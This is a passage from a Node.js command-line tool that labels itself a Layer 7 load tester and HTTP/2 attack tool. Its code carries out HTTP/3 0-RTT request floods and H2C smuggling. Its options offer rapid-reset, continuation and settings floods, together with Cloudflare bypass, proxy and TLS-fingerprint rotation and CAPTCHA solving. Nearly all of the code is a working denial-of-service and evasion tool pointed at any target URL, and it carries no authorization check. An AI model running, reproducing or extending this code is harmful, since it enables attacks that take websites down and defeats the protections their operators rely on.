      const client = http2.connect(this.target.origin, {
        timeout: this.config.timeout,
        ...this.getRandomTlsProfile()
      });
      
      client.on('error', reject);
      
      // Simulate 0-RTT data by sending data immediately after connection
      client.on('connect', () => {
        const req = client.request({
          ':path': this.target.pathname + this.target.search,
          ':method': 'POST',
          'content-length': '1024',
          ...this.cloudflareBypass.getRandomHeaders()
        });
        
        // Send "early data" (simulated 0-RTT)
        req.write('0'.repeat(1024));
        
        // Flood with multiple requests
        const floodCount = 30;
        let sent = 0;
        
        const sendRequest = () => {
          if (sent >= floodCount) {
            req.end();
            return;
          }
          
          const floodReq = client.request({
            ':path': this.target.pathname + this.target.search,
            ':method': 'GET',
            ...this.cloudflareBypass.getRandomHeaders()
          });
          
          floodReq.end();
          sent++;
          
          // Small delay between requests
          setTimeout(sendRequest, 10);
        };
        
        req.on('response', (headers) => {
          client.destroy();
          resolve({
            statusCode: headers[':status'] || 0,
            headers,
            data: `HTTP/3 0-RTT Flood attack with ${floodCount} requests`
          });
        });
        
        req.on('error', (err) => {
          client.destroy();
          resolve({
            statusCode: 0,
            headers: {},
            data: 'HTTP/3 0-RTT Flood attack triggered error',
            error: err.message
          });
        });
        
        // Start flooding
        sendRequest();
      });
      
      client.setTimeout(this.config.timeout, () => {
        client.destroy();
        reject(new Error('Connection timeout'));
      });
    });
  }

  async executeH2CSmugglingAttack(protocol) {
    if (protocol !== 'http2') {
      throw new Error('H2C Smuggling attack only works with HTTP/2');
    }
    
    return new Promise((resolve, reject) => {
      // Create an HTTP/1.1 connection first
      const req = (this.target.protocol === 'https:' ? https : http).request({
        hostname: this.target.hostname,
        port: this.target.port || (this.target.protocol === 'https:' ? 443 : 80),
        path: this.target.pathname + this.target.search,
        method: 'GET',
        headers: {
          ...this.cloudflareBypass.getRandomHeaders(),
          'Connection': 'Upgrade, HTTP2-Settings',
          'Upgrade': 'h2c',
          'HTTP2-Settings': Buffer.from('AAMAAABkAAQAAP__').toString('base64'), // Fake HTTP/2 settings
          'Content-Length': '0'
        },
        timeout: this.config.timeout
      });
      
      req.on('response', (res) => {
        // If server doesn't upgrade, try to smuggle HTTP/2 traffic
        if (res.statusCode !== 101) {
          // Try to send HTTP/2 frames over HTTP/1.1 connection
          try {
            const http2Frame = Buffer.from([
              0x00, 0x00, 0x10, // Length
              0x01,             // Type (HEADERS)
              0x25,             // Flags (END_HEADERS | END_STREAM)
              0x00, 0x00, 0x00, 0x01, // Stream ID
              0x00,             // Pad length
              0x00, 0x00, 0x00, 0x00, // Dependency
              0x00,             // Weight
              0x00, 0x00, 0x00, 0x00, // Exclusive + Stream dependency
              0x82,             // Indexed header field (method: GET)
              0x84,             // Indexed header field (path: /)
              0x86              // Indexed header field (scheme: https)
            ]);
            
            res.socket.write(http2Frame);
            
            resolve({
              statusCode: res.statusCode,
              headers: res.headers,
              data: 'H2C Smuggling attack attempted'
            });
          } catch (err) {
            resolve({
              statusCode: res.statusCode,
              headers: res.headers,
              data: 'H2C Smuggling attack failed',
              error: err.message
            });
          }
        } else {
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            data: 'H2C Smuggling attack - server upgraded to h2c'
          });
        }
      });
      
      req.on('error', (err) => {
        reject(err);
      });
      
      req.setTimeout(this.config.timeout, () => {
        req.destroy();
        reject(new Error('Request timeout'));
      });
      
      req.end();
    });
  }

  getRandomTlsProfile() {
    return TLS_PROFILES[Math.floor(Math.random() * TLS_PROFILES.length)];
  }

  updateStats(protocol, statusCode, startTime, error) {
    const latency = Math.round(performance.now() - startTime);
    
    this.stats.requests.total++;
    
    if (error || statusCode === 0) {
      this.stats.requests.errors++;
    } else if (statusCode >= 200 && statusCode < 400) {
      this.stats.requests.success++;
    }
    
    // Update protocol stats
    if (this.stats.requests.byProtocol[protocol] !== undefined) {
      this.stats.requests.byProtocol[protocol]++;
    }
    
    // Update status code stats
    if (statusCode > 0) {
      this.stats.requests.byStatus[statusCode] = (this.stats.requests.byStatus[statusCode] || 0) + 1;
    }
    
    // Update latency stats
    this.stats.latency.min = Math.min(this.stats.latency.min, latency);
    this.stats.latency.max = Math.max(this.stats.latency.max, latency);
    this.stats.latency.sum += latency;
    this.stats.latency.count++;
    
    // Calculate RPS
    const now = Date.now();
    const timeDiff = (now - this.stats.lastRpsUpdate) / 1000;
    
    if (timeDiff >= 1) {
      const requestDiff = this.stats.requests.total - this.stats.lastRequestCount;
      this.stats.rps = requestDiff / timeDiff;
      this.stats.lastRpsUpdate = now;
      this.stats.lastRequestCount = this.stats.requests.total;
    }
  }

  addRecentEvent(event) {
    this.recentEvents.unshift(event);
    
    if (this.recentEvents.length > this.maxEvents) {
      this.recentEvents.pop();
    }
  }

  setupMonitoring() {
    if (this.config.outputFormat !== 'cli') return;
    
    // Clear console
    console.clear();
    
    // Set up interval to update display
    this.monitorInterval = setInterval(() => {
      this.updateDisplay();
    }, 1000);
    
    // Clean up on stop
    this.on('complete', () => {
      clearInterval(this.monitorInterval);
    });
  }

  updateDisplay() {
    if (!this.isRunning) return;
    
    // Clear console
    console.clear();
    
    // Calculate elapsed time
    const elapsed = (Date.now() - this.stats.startTime) / 1000;
    const remaining = Math.max(0, this.config.duration - elapsed);
    
    // Display header
    console.log(chalk.cyan.bold(`Layer 7 Load Tester & HTTP/2 Attack Tool`));
    console.log(chalk.gray(`Target: ${this.target.origin}`));
    console.log(chalk.gray(`Elapsed: ${elapsed.toFixed(1)}s | Remaining: ${remaining.toFixed(1)}s`));
    console.log('');
    
    // Display stats
    console.log(chalk.white.bold('Statistics:'));
    console.log(`  RPS: ${chalk.green(this.stats.rps.toFixed(2))}`);
    console.log(`  Requests: ${chalk.yellow(this.stats.requests.total)} (${chalk.green(this.stats.requests.success)} success, ${chalk.red(this.stats.requests.errors)} errors)`);
    console.log(`  Latency: ${chalk.blue((this.stats.latency.sum / this.stats.latency.count || 0).toFixed(2))}ms (min: ${chalk.blue(this.stats.latency.min === Infinity ? 0 : this.stats.latency.min)}ms, max: ${chalk.blue(this.stats.latency.max)}ms)`);
    console.log(`  Adaptive Delay: ${this.currentDelay > 0 ? chalk.yellow(this.currentDelay + 'ms') : chalk.green('None')}`);
    console.log('');
    
    // Display protocol breakdown
    console.log(chalk.white.bold('Protocol Breakdown:'));
    console.log(`  HTTP/1.1: ${chalk.yellow(this.stats.requests.byProtocol.http1)} (${(this.stats.requests.byProtocol.http1 / this.stats.requests.total * 100 || 0).toFixed(1)}%)`);
    console.log(`  HTTP/2: ${chalk.yellow(this.stats.requests.byProtocol.http2)} (${(this.stats.requests.byProtocol.http2 / this.stats.requests.total * 100 || 0).toFixed(1)}%)`);
    console.log(`  HTTP/3: ${chalk.yellow(this.stats.requests.byProtocol.http3)} (${(this.stats.requests.byProtocol.http3 / this.stats.requests.total * 100 || 0).toFixed(1)}%)`);
    console.log('');
    
    // Display status code breakdown
    console.log(chalk.white.bold('Status Code Breakdown:'));
    const statusCodes = Object.keys(this.stats.requests.byStatus).sort((a, b) => parseInt(a) - parseInt(b));
    
    for (const code of statusCodes) {
      const count = this.stats.requests.byStatus[code];
      const percentage = (count / this.stats.requests.total * 100).toFixed(1);
      
      let color = chalk.white;
      if (code >= 200 && code < 300) color = chalk.green;
      else if (code >= 300 && code < 400) color = chalk.blue;
      else if (code >= 400 && code < 500) color = chalk.yellow;
      else if (code >= 500) color = chalk.red;
      
      console.log(`  ${color(code)}: ${count} (${percentage}%)`);
    }
    console.log('');
    
    // Display recent events
    console.log(chalk.white.bold('Recent Events:'));
    for (const event of this.recentEvents.slice(0, 10)) {
      const time = new Date(event.timestamp).toLocaleTimeString();
      let statusColor = chalk.white;
      
      if (event.statusCode >= 200 && event.statusCode < 300) statusColor = chalk.green;
      else if (event.statusCode >= 300 && event.statusCode < 400) statusColor = chalk.blue;
      else if (event.statusCode >= 400 && event.statusCode < 500) statusColor = chalk.yellow;
      else if (event.statusCode >= 500) statusColor = chalk.red;
      else if (event.error) statusColor = chalk.red;
      
      const statusText = event.statusCode > 0 ? statusColor(event.statusCode) : statusColor('Error');
      const protocolText = event.protocol.toUpperCase();
      
      console.log(`  [${time}] ${protocolText} ${statusText} ${event.latency}ms ${event.error ? chalk.red(event.error) : ''}`);
    }
  }

  log(message, level = 'info') {
    if (this.config.outputFormat === 'json') return;
    
    const levels = ['debug', 'info', 'warn', 'error'];
    const currentLevelIndex = levels.indexOf(this.config.logLevel);
    const messageLevelIndex = levels.indexOf(level);
    
    if (messageLevelIndex < currentLevelIndex) return;
    
    let color = chalk.white;
    if (level === 'error') color = chalk.red;
    else if (level === 'warn') color = chalk.yellow;
    else if (level === 'info') color = chalk.green;
    else if (level === 'debug') color = chalk.blue;
    
    console.log(`[${new Date().toISOString()}] ${color(level.toUpperCase())}: ${message}`);
  }
}

// Parse command line arguments
program
  .name('pv_http.js')
  .description('Layer 7 Load Tester & HTTP/2 Attack Tool with Advanced Cloudflare Bypass')
  .version('1.0.0')
  
  .requiredOption('-t, --target <url>', 'Target URL to test')
  .option('-d, --duration <seconds>', 'Test duration in seconds', DEFAULT_CONFIG.duration)
  .option('-c, --threads <count>', 'Number of concurrent threads', DEFAULT_CONFIG.threads)
  .option('-r, --rate <rps>', 'Requests per second', DEFAULT_CONFIG.rate)
  .option('--timeout <ms>', 'Request timeout in milliseconds', DEFAULT_CONFIG.timeout)
  .option('--protocol <protocol>', 'Protocol to use (auto, http1, http2, http3)', DEFAULT_CONFIG.protocol)
  .option('--attack <mode>', 'Attack mode (rapid-reset, madeyoureset, continuation-flood, settings-flood, http3-0rtt-flood, h2c-smuggling)')
  .option('--no-ua-rotation', 'Disable User-Agent rotation')
  .option('--no-adaptive-delay', 'Disable adaptive delay')
  .option('--bypass-cloudflare', 'Enable Cloudflare bypass')
  .option('--bypass-method <method>', 'Bypass method (auto, puppeteer, zenrows, proxy, hybrid)', DEFAULT_CONFIG.bypassMethod)
  .option('--proxy-list <file>', 'File containing proxy list (one per line)')
  .option('--no-proxy-rotation', 'Disable proxy rotation')
  .option('--zenrows-api-key <key>', 'ZenRows API key for Cloudflare bypass')
  .option('--zenrows-proxy-country <code>', 'ZenRows proxy country code (e.g., us, id, gb)')
  .option('--zenrows-antibot', 'Enable ZenRows antibot features')
  .option('--zenrows-antibot-score <score>', 'ZenRows antibot score (1-5)', '3')
  .option('--zenrows-wait-for <selector>', 'CSS selector to wait for')
  .option('--zenrows-block-resources <types>', 'Resource types to block (e.g., image,font,media)')
  .option('--no-zenrows-custom-headers', 'Disable custom headers for ZenRows')
  .option('--no-cookies', 'Disable cookie persistence')
  .option('--cookie-file <path>', 'Path to cookie file', DEFAULT_CONFIG.cookieFile)
  .option('--no-human-simulation', 'Disable human behavior simulation')
  .option('--solve-captcha', 'Enable CAPTCHA solving (requires API key)')
  .option('--captcha-api-key <key>', 'CAPTCHA solving API key')
  .option('--use-antibot', 'Enable antibot features for ZenRows')
  .option('--output <format>', 'Output format (cli, json)', DEFAULT_CONFIG.outputFormat)
  .option('--log-level <level>', 'Log level (debug, info, warn, error)', DEFAULT_CONFIG.logLevel)
  .option('-o, --output-file <path>', 'Save results to file')
  
  .action(async (options) => {
    // Convert options to appropriate types
    const config = {
      duration: parseInt(options.duration),
      threads: parseInt(options.threads),
      rate: parseInt(options.rate),
      timeout: parseInt(options.timeout),
      protocol: options.protocol,
      attackMode: options.attack,
      userAgentRotation: options.uaRotation,
      adaptiveDelay: options.adaptiveDelay,
      bypassCloudflare: options.bypassCloudflare,
      bypassMethod: options.bypassMethod,
      proxyRotation: options.proxyRotation,
      zenrowsApiKey: options.zenrowsApiKey || '',
      zenrowsProxyCountry: options.zenrowsProxyCountry || '',
      zenrowsAntibot: options.zenrowsAntibot,
      zenrowsAntibotScore: options.zenrowsAntibotScore || '3',
      zenrowsWaitFor: options.zenrowsWaitFor || '',
      zenrowsBlockResources: options.zenrowsBlockResources || '',
      zenrowsCustomHeaders: options.zenrowsCustomHeaders,
      useCookies: options.cookies,
      cookieFile: options.cookieFile,
      simulateHuman: options.humanSimulation,
      solveCaptcha: options.solveCaptcha,
      captchaApiKey: options.captchaApiKey || '',
      useAntibot: options.useAntibot,
      outputFormat: options.output,
      logLevel: options.logLevel
    };
    
    // Load proxy list if provided
    if (options.proxyList) {
      try {
        const proxyData = fs.readFileSync(options.proxyList, 'utf8');
        config.proxyList = proxyData.split('\n')
          .map(line => line.trim())
          .filter(line => line.length > 0);
        
        console.log(`Loaded ${config.proxyList.length} proxies`);
      } catch (err) {
        console.error(`Failed to load proxy list: ${err.message}`);
        process.exit(1);
      }
    }
    
    // Create load tester instance
    const loadTester = new LoadTester(config);
    
    // Handle completion
    loadTester.on('complete', (stats) => {
      if (options.outputFile) {
        fs.writeFileSync(options.outputFile, JSON.stringify(stats, null, 2));
        console.log(`Results saved to ${options.outputFile}`);
      }
      
      if (options.output === 'json') {
        console.log(JSON.stringify(stats, null, 2));
      }
      
      process.exit(0);
    });
    
    // Start the test
    try {
      await loadTester.start(options.target);
    } catch (error) {
      console.error(`Error: ${error.message}`);
      process.exit(1);
    }
  });

program.parse();
